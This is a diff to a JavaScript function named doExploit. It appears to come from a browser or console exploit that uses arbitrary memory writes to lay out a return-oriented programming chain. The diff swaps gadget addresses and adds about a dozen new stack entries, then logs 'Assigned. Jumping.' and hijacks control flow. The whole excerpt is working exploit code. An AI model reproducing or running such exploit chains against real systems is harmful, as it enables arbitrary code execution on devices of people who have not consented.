@@ -386,14 +386,26 @@ function doExploit(buf, stale, temp) {
 		write8(block2, init, 0x28 >> 2);
 
 		sp = add2(sp, -0x800);
-		write8(mref(0x181E9C), block1, 0x58 >> 2);
+		write8(mref(0x1A1C98), block1, 0x58 >> 2);
 		write8(sp, block1, 0x68 >> 2);
 
 		var regsaveblock = malloc(0x200);
-		write8(mref(0x4336b0), block2, 0x10 >> 2);
+		write8(mref(0x4336B0), block2, 0x10 >> 2);
 		write8(regsaveblock, block2, 0x28 >> 2);
 
-		write8(mref(0x181E9C), sp, 0);
+		write8(mref(0x3A278C), sp, 0);
+		write8(mref(0x181E9C), sp, 0x10 >> 2);
+		write8(mref(0x582AE8), sp, 0x28 >> 2);
+		write8(add2(sp, 0x7F0), sp, 0x38 >> 2);
+		write8(mref(0x39DEC4), sp, 0x50 >> 2);
+		write8(mref(0x3A278C), sp, 0x58 >> 2);
+		write8(add2(sp, 0x7F8), sp, 0x68 >> 2);
+		write8(mref(0x582AE8), sp, 0x80 >> 2);
+		write8(add2(regsaveblock, 0xF0), sp, 0x90 >> 2);
+		write8(mref(0x39DEC4), sp, 0xA8 >> 2);
+		write8(mref(0x3A278C), sp, 0xB0 >> 2);
+		write8(regsaveblock, sp, 0xC0 >> 2);
+		write8(mref(0x433620), sp, 0xD8 >> 2);
 
 		log('Assigned.  Jumping.');
 		func.apply(0x101);
